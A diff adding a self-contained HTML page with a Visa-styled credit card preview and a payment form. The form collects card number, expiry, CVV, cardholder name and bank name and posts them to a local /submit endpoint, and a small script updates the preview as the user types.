@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Visa Card Form</title>
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+  <style>
+    /* Reset and base styles */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 400px;
+    }
+
+    /* Credit card preview */
+    .card-container {
+      background: linear-gradient(135deg, #1a1f71, #3a4ba2);
+      color: white;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+      margin-bottom: 30px;
+      height: 220px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .chip {
+      width: 50px;
+      height: 35px;
+      background: gold;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .card-number {
+      font-size: 1.3rem;
+      letter-spacing: 3px;
+      margin-bottom: 12px;
+    }
+
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.8rem;
+    }
+
+    .card-details div {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .visa-logo {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ffcc00;
+    }
+
+    /* Form styles */
+    .card-form {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .card-form input,
+    .card-form textarea {
+      padding: 12px;
+      font-size: 1rem;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      transition: border-color 0.3s;
+    }
+
+    .card-form input:focus,
+    .card-form textarea:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+
+    .card-form textarea {
+      resize: vertical;
+      min-height: 60px;
+    }
+
+    .card-form button {
+      padding: 12px;
+      background-color: #ffcc00;
+      color: #1a1f71;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .card-form button:hover {
+      background-color: #e6b800;
+    }
+
+    /* Responsive adjustments */
+    @media (min-width: 600px) {
+      .wrapper {
+        max-width: 450px;
+      }
+
+      .card-container {
+        height: 240px;
+        padding: 25px;
+      }
+
+      .card-number {
+        font-size: 1.5rem;
+      }
+
+      .visa-logo {
+        font-size: 2rem;
+      }
+
+      .card-form input,
+      .card-form textarea {
+        font-size: 1.1rem;
+      }
+
+      .card-form button {
+        font-size: 1.1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wrapper">
+    <!-- Visa Card Preview -->
+    <div class="card-container">
+      <div class="chip"></div>
+      <div class="card-number" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+      <div class="card-details">
+        <div>
+          <span>Card Holder</span>
+          <strong id="cardHolderDisplay">FULL NAME</strong>
+        </div>
+        <div>
+          <span>Expires</span>
+          <strong id="expiryDisplay">MM/YY</strong>
+        </div>
+      </div>
+      <div class="visa-logo">VISA</div>
+    </div>
+
+    <!-- Form -->
+    <form class="card-form" action="/submit" method="POST">
+      <input type="text" name="card_number" placeholder="Card Number" maxlength="19" oninput="updateCardNumber(this.value)" required>
+
+      <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" oninput="updateExpiry(this.value)" required>
+
+      <input type="text" name="cvv" placeholder="CVV" maxlength="4" required>
+
+      <input type="text" name="cardholder" placeholder="Cardholder Name" oninput="updateCardHolder(this.value)" required>
+
+      <textarea name="bank_name" placeholder="Bank Name" required></textarea>
+
+      <button type="submit">Pay</button>
+    </form>
+  </div>
+
+  <script>
+    function updateCardNumber(val) {
+      const formatted = val.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+      document.getElementById('cardNumberDisplay').textContent = formatted || '•••• •••• •••• ••••';
+    }
+
+    function updateExpiry(val) {
+      document.getElementById('expiryDisplay').textContent = val || 'MM/YY';
+    }
+
+    function updateCardHolder(val) {
+      document.getElementById('cardHolderDisplay').textContent = val.toUpperCase() || 'FULL NAME';
+    }
+  </script>
+
+</body>
+</html>
